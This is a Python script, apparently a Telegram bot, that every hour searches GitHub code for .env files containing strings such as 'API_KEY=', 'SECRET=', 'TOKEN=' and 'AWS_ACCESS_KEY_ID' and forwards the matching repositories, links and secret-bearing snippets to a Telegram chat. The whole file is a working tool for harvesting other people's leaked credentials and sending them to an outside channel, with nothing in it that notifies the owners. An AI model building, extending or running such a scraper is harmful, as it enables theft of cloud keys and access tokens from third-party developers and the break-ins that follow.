import os
import requests
import time
from telebot import TeleBot

TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")  # Получаем токен GitHub из окружения

bot = TeleBot(TOKEN)

SEARCH_KEYWORDS = ['API_KEY=', 'SECRET=', 'TOKEN=', 'AWS_ACCESS_KEY_ID']
GITHUB_SEARCH_URL = 'https://api.github.com/search/code'
HEADERS = {
    'Accept': 'application/vnd.github.v3.text-match+json',
    'Authorization': f'token {GITHUB_TOKEN}'  # Передаём токен для аутентификации
}
RESULTS_PER_PAGE = 10

def search_github(keyword, page=1):
    params = {
        'q': f'{keyword} in:file filename:.env',
        'page': page,
        'per_page': RESULTS_PER_PAGE
    }
    try:
        response = requests.get(GITHUB_SEARCH_URL, headers=HEADERS, params=params)
        print(f"GitHub response status: {response.status_code}")  # Debugging line
        if response.status_code == 200:
            return response.json().get('items', [])
        else:
            print("Error fetching from GitHub:", response.status_code)  # Debugging line
    except Exception as e:
        print(f"Error during request: {e}")  # Debugging line
    return []

def extract_info(item):
    repo = item['repository']['full_name']
    url = item['html_url']
    snippet = ''
    for match in item.get('text_matches', []):
        snippet += match.get('fragment', '') + '\n'
    return f"{repo} | {url} | {snippet.strip()}"

def run_scan():
    found = []
    for keyword in SEARCH_KEYWORDS:
        results = search_github(keyword)
        if not results:
            print(f"No results found for {keyword}")  # Debugging line
        for item in results:
            info = extract_info(item)
            if info:
                found.append(info)
    return found

def send_to_telegram(results):
    if results:
        for entry in results:
            bot.send_message(CHAT_ID, f"Найдено:\n{entry}")
    else:
        bot.send_message(CHAT_ID, "Ничего не найдено.")

# Запуск бесконечного цикла
while True:
    print("Запуск сканирования...")
    data = run_scan()
    send_to_telegram(data)
    print("Сканирование завершено. Ожидание следующего круга...")
    time.sleep(3600)  # Сканировать каждый час
